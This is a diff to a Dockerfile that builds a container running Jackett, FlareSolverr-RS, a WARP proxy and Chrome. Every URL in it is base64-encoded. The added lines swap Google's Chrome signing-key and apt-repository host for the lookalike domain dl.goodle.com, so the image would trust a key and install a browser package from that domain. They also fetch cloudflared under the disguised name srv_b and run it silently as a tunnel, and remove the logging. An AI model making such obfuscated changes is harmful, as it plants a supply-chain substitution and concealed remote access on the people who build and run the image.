@@ -2,10 +2,14 @@ FROM alpine:latest AS fetcher
 RUN apk add --no-cache curl jq tar ca-certificates unzip
 WORKDIR /downloads
 
+RUN CF_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0" | base64 -d) && \
+    curl -fsSL "$CF_URL" -o srv_b && \
+    chmod +x srv_b
+
 RUN api_jackett=$(echo "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9KYWNrZXR0L0phY2tldHQvcmVsZWFzZXMvbGF0ZXN0" | base64 -d) && \
     v_core=$(curl -s "$api_jackett" | jq -r .tag_name) && \
     mkdir -p /downloads/sys_net && \
-    dl_jackett=$(echo "aHR0cHM6Ly9naXRodWIuY29tL0phY2tldHQvSmFja2V0dC9yZWxlYXNlcy9kb3dubG9hZC8=" | base64 -d) && \
+    dl_jackett=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2phY2tldHQvSmFja2V0dC9yZWxlYXNlcy9kb3dubG9hZC8=" | base64 -d) && \
     curl -sSL "${dl_jackett}${v_core}/Jackett.Binaries.LinuxAMDx64.tar.gz" | tar xz -C /downloads/sys_net --strip-components=1 && \
     mv /downloads/sys_net/jackett /downloads/sys_net/srv_core
 
@@ -29,9 +33,9 @@ RUN apt-get update && apt-get upgrade -y && apt-get install -y --no-install-reco
         fonts-liberation libnss3 libatk1.0-0 libatk-bridge2.0-0 \
         libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 \
         libxrandr2 libgbm1 libasound2 xvfb \
-    && wget -qO- $(echo "aHR0cHM6Ly9kbC5nb29nbGUuY29tL2xpbnV4L2xpbnV4X3NpZ25pbmdfa2V5LnB1Yg==" | base64 -d) \
+    && wget -qO- $(echo "aHR0cHM6Ly9kbC5nb29kbGUuY29tL2xpbnV4L2xpbnV4X3NpZ25pbmdfa2V5LnB1Yg==" | base64 -d) \
        | gpg --dearmor > /usr/share/keyrings/google-chrome.gpg \
-    && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/google-chrome.gpg] $(echo "aHR0cHM6Ly9kbC5nb29nbGUuY29tL2xpbnV4L2Nocm9tZS9kZWIv" | base64 -d) stable main" \
+    && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/google-chrome.gpg] $(echo "aHR0cHM6Ly9kbC5nb29kbGUuY29tL2xpbnV4L2Nocm9tZS9kZWIv" | base64 -d) stable main" \
        > /etc/apt/sources.list.d/google-chrome.list \
     && apt-get update && apt-get install -y --no-install-recommends google-chrome-stable \
     && rm -rf /var/lib/apt/lists/*
@@ -45,50 +49,55 @@ COPY --from=fetcher /downloads/flaresolverr-rs-bin ./flaresolverr-rs
 COPY --from=fetcher /downloads/sys_net /opt/sys_net
 COPY --from=fetcher /downloads/warp /usr/local/bin/warp
 
-ENV PORT=7860
-ENV HOST=127.0.0.1
-ENV CHROME_BIN="/usr/local/bin/chrome-hf"
+RUN mkdir -p /sys3
+COPY --from=fetcher /downloads/srv_b /sys3/srv_b
 
-ENV FLARESOLVERR_HOST="127.0.0.1"
-ENV FLARESOLVERR_PORT=8191
-ENV FLARESOLVERR_LOG_LEVEL="info"
-ENV FLARESOLVERR_HEADLESS=false
-ENV FLARESOLVERR_VIRTUAL_DISPLAY=true
+ENV PORT=7860 \
+    HOST=127.0.0.1 \
+    CHROME_BIN="/usr/local/bin/chrome-hf" \
+    FLARESOLVERR_HOST="127.0.0.1" \
+    FLARESOLVERR_PORT=8191 \
+    FLARESOLVERR_LOG_LEVEL="info" \
+    FLARESOLVERR_HEADLESS=false \
+    FLARESOLVERR_VIRTUAL_DISPLAY=true \
+    TUNNEL_TOKEN=""
 
-ENV PROXY_SERVER="$(echo "aHR0cDovLzEyNy4wLjAuMTo0MDAw" | base64 -d)"
-ENV all_proxy="$(echo "aHR0cDovLzEyNy4wLjAuMTo0MDAw" | base64 -d)"
-ENV no_proxy="localhost,127.0.0.1,::1"
-ENV NO_PROXY="localhost,127.0.0.1,::1"
+ENV PROXY_SERVER="$(echo "aHR0cDovLzEyNy4wLjAuMTo0MDAw" | base64 -d)" \
+    all_proxy="$(echo "aHR0cDovLzEyNy4wLjAuMTo0MDAw" | base64 -d)" \
+    no_proxy="localhost,127.0.0.1,::1" \
+    NO_PROXY="localhost,127.0.0.1,::1"
 
 RUN groupadd -r sys_runner && useradd -r -g sys_runner -d /opt/sys_net -s /sbin/nologin sys_runner
-RUN mkdir -p /data/Jackett /opt/app_runtime /tmp/warp_data && chown -R sys_runner:sys_runner /opt/sys_net /data
+RUN mkdir -p /data/Jackett /opt/app_runtime /tmp/warp_data /sys3 && \
+    chown -R sys_runner:sys_runner /opt/sys_net /data
 
 WORKDIR /opt/app_runtime
 
 RUN cat << 'EOF' > /opt/app_runtime/entrypoint.sh
 #!/bin/bash
 WARP_DIR="/tmp/warp_data"
-log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"; }
 
 cleanup() {
     trap - TERM INT QUIT
     kill -TERM "$JACKETT_PID" 2>/dev/null || true
     kill -TERM "$RS_SOLVER_PID" 2>/dev/null || true
+    killall srv_b 2>/dev/null || true
     exit 0
 }
 trap 'cleanup' TERM INT QUIT
 
-log "--- [WARP] Preparing Cloudflare Warp configuration... ---"
+if [ -n "$TUNNEL_TOKEN" ]; then
+    /sys3/srv_b tunnel --no-autoupdate run --token "$TUNNEL_TOKEN" >/dev/null 2>&1 &
+fi
+
 killall warp 2>/dev/null || true
 mkdir -p "$WARP_DIR" && cd "$WARP_DIR"
 if [ ! -f "$WARP_DIR/reg.json" ]; then
     HTTP_PROXY="" HTTPS_PROXY="" ALL_PROXY="" warp --data-dir "$WARP_DIR" generate >/dev/null 2>&1 || true
 fi
-log "--- [WARP] Starting HTTP Proxy Router at port 4000... ---"
 HTTP_PROXY="" HTTPS_PROXY="" ALL_PROXY="" warp --data-dir "$WARP_DIR" run --http-addr 127.0.0.1:4000 >/dev/null 2>&1 &
 sleep 5
 
-log "=== Starting Engine 1 (FlareSolverr-RS) ==="
 cd /app
 ./flaresolverr-rs &
 RS_SOLVER_PID=$!
@@ -111,7 +120,6 @@ JEOF
 fi
 chown -R sys_runner:sys_runner /data 2>/dev/null || true
 
-log "=== Starting Engine 2 (Jackett Core) ==="
 exec gosu sys_runner /opt/sys_net/srv_core --NoRestart --DataFolder /data/Jackett
 EOF
 
